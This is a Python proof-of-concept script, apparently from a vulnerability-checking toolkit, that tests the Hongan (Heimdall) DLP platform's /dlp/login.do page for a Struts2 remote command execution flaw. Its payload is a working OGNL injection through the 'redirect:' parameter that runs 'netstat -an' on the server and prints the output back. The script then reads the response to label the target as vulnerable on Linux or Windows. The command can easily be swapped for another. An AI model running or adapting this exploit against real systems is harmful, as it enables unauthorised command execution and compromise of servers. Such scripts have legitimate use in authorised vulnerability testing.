#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 虹安DLP数据泄露防护平台struts2远程命令执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0131375
author: Lucifer
description: oshadan "Heimdall DLP数据泄漏防护系统" /dlp/login.do存在struts2远程命令执行漏洞。
'''
import sys
import requests
import warnings

  

class hongan_dlp_struts_exec:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['虹安DLP数据泄露防护平台struts2远程命令执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dlp/login.do?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Active Internet connections" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\t[Linux]"
                return result

            elif r"Active Connections" in req.text or r"活动连接" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\t[Windows]"
                return result

            elif r"LISTEN" in req.text:
                result[2] ='可能存在'
                result[1] = vulnurl
                return result


            else:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hongan_dlp_struts_exec(sys.argv[1])
    testVuln.run()